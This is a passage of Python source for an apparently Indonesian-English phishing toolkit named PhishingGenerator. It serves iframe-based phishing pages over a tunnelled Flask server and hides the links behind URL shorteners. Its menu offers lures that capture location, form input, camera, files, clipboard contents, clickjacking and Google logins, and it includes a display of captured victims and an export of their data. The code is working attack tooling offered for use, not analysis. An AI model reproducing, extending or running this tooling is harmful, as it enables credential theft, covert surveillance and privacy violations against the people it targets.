                <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
                <meta name="HandheldFriendly" content="true">
                <style>
                    body {{ margin: 0; padding: 0; }}
                </style>
            </head>
            <body>
                <iframe src="/phish/{phish_id}?type={phish_type}&url={target_url}" style="width:100%; height:100vh; border:none;"></iframe>
            </body>
            </html>
            """
            with open(template_path, "w", encoding="utf-8") as f:
                f.write(proxy_template)
                
            shortened_url = None
            for name, fn in [("is.gd", lambda u: self.shortener.isgd.short(u)),
                              ("da.gd", lambda u: self.shortener.dagd.short(u)),
                              ("TinyURL", lambda u: self.shortener.tinyurl.short(u))]:
                try:
                    shortened_url = fn(phish_url)
                    if shortened_url:
                        break
                except Exception as e:
                    console.print(f"[dim]  {name} failed: {str(e)[:60]}[/]")
                    continue

            if not shortened_url:
                console.print("[yellow]⚠ All URL shorteners failed. Raw link below:[/]")
                shortened_url = phish_url
            
            sep = "─" * 40
            console.print(f"\n{sep}")
            console.print(f"🎣 {'LINK PHISHING BERHASIL DIBUAT!' if self.language == 'id' else 'PHISHING LINK CREATED!'}")
            console.print(sep)
            console.print(f"\n📎 {'URL Phishing' if self.language == 'id' else 'Phishing URL'}:\n   [green]{shortened_url}[/]\n")
            console.print(f"✨ {'Link telah dipersingkat!' if self.language == 'id' else 'Link has been shortened!'}")
            console.print(f"⚠️  {'Link aktif hingga program ditutup' if self.language == 'id' else 'Link active until program closes'}")
            console.print(sep)
            
            return shortened_url
            
        except Exception as e:
            self.logger.error(f"Error generating phishing link: {str(e)}")
            console.print(f"\n[red]❌ Gagal membuat link phishing: {str(e)}[/]")
            return None

    def run(self):
        """Menjalankan program phishing dengan tampilan realtime"""
        try:
            self.select_language()
            self.select_tunnel_engine()

            flask_thread = threading.Thread(
                target=lambda: self.app.run(
                    host='0.0.0.0', 
                    port=self.server_port,
                    threaded=True,
                    debug=False
                )
            )
            flask_thread.daemon = True
            flask_thread.start()

            # Wait for Flask to actually bind the port
            for _ in range(10):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect(('127.0.0.1', self.server_port))
                    s.close()
                    break
                except:
                    time.sleep(0.5)

            self.setup_tunnel()
            
            while True:
                self.clear_screen()
                self.display_banner()
                self.display_menu()
                
                choice = console.input(f"\n[yellow][[?]] {'Select menu' if self.language == 'en' else 'Pilih menu'} (1-12): [/]")
                
                if choice == "1":
                    target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
                    with Progress() as progress:
                        task = progress.add_task("[cyan]Generating phishing link...", total=100)
                        self.generate_phishing_link("location", target_url=target)
                        progress.update(task, advance=100)
                    console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
                
                elif choice == "2":
                    target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
                    with Progress() as progress:
                        task = progress.add_task("[cyan]Generating phishing link...", total=100)
                        self.generate_phishing_link("form", target_url=target)
                        progress.update(task, advance=100)
                    console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
                
                elif choice == "3":
                    target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
                    with Progress() as progress:
                        task = progress.add_task("[cyan]Generating phishing link...", total=100)
                        self.generate_phishing_link("camera", target_url=target)
                        progress.update(task, advance=100)
                    console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
                
                elif choice == "4":
                    target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
                    with Progress() as progress:
                        task = progress.add_task("[cyan]Generating phishing link...", total=100)
                        self.generate_phishing_link("file", target_url=target)
                        progress.update(task, advance=100)
                    console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
                
                elif choice == "5":
                    target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
                    with Progress() as progress:
                        task = progress.add_task("[cyan]Generating phishing link...", total=100)
                        self.generate_phishing_link("clipboard", target_url=target)
                        progress.update(task, advance=100)
                    console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
                
                elif choice == "6":
                    target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
                    with Progress() as progress:
                        task = progress.add_task("[cyan]Generating phishing link...", total=100)
                        self.generate_phishing_link("combo", target_url=target)
                        progress.update(task, advance=100)
                    console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")

                elif choice == "7":
                    target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
                    with Progress() as progress:
                        task = progress.add_task("[cyan]Generating phishing link...", total=100)
                        self.generate_phishing_link("clickjack", target_url=target)
                        progress.update(task, advance=100)
                    console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")

                elif choice == "8":
                    target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
                    with Progress() as progress:
                        task = progress.add_task("[cyan]Generating phishing link...", total=100)
                        self.generate_phishing_link("googleauth", target_url=target)
                        progress.update(task, advance=100)
                    console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")

                elif choice == "9":
                    self.show_victims = True
                    self.update_live_display()
                    console.input(f"\n[green]{'Press Enter to return to menu...' if self.language == 'en' else 'Tekan Enter untuk kembali ke menu...'}[/]")
                    self.show_victims = False
                    if self.live_display:
                        self.live_display.stop()
                        self.live_display = None
                
                elif choice == "10":
                    self.export_results()
                
                elif choice == "11":
                    self.settings_menu()
                
                elif choice == "12":
                    msg = "Closing program..." if self.language == "en" else "Menutup program..."
                    console.print(f"\n[red][[!]] {msg}[/]")
                    break
                    
        except KeyboardInterrupt:
            msg = "Program terminated by user" if self.language == "en" else "Program dihentikan oleh user"
            console.print(f"\n[red][[!]] {msg}[/]")
        except Exception as e:
            self.logger.error(f"Runtime error: {str(e)}")
            console.print(f"\n[red][[!]] Error: {str(e)}[/]")
        finally:
            if self.live_display:
                self.live_display.stop()
            if self.tunnel_process:
                try: self.tunnel_process.terminate()
                except: pass
            ngrok.kill()

if __name__ == "__main__":
    phisher = PhishingGenerator()
    phisher.run()
